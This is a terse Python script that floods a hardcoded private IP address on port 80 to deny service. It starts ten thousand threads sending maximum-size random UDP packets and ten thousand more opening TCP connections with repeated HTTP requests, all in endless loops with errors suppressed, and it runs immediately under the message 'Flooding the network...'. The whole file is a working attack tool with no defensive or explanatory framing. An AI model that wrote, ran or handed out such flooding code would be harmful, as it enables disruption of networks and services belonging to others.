import socket as s
import threading as th
import random as r

i = "192.168.15.1"
p = 80

def u(i, p):
    while True:
        try:
            so = s.socket(s.AF_INET, s.SOCK_DGRAM)
            d = r._urandom(65507)
            while True:
                so.sendto(d, (i, p))
        except:
            pass

def d(i, p):
    while True:
        try:
            so = s.socket(s.AF_INET, s.SOCK_STREAM)
            so.connect((i, p))
            r = f"GET / HTTP/1.1\r\nHost: {i}\r\n\r\n"
            so.send(r.encode())
            while True:
                so.recv(1024 * 10274)
        except:
            pass

def f():
    ths = []
    for _ in range(10000):
        t = th.Thread(target=u, args=(i, p))
        ths.append(t)
        t.start()
    for _ in range(10000):
        t = th.Thread(target=d, args=(i, p))
        ths.append(t)
        t.start()
    for t in ths:
        t.join()

print("Flooding the network...")
f()
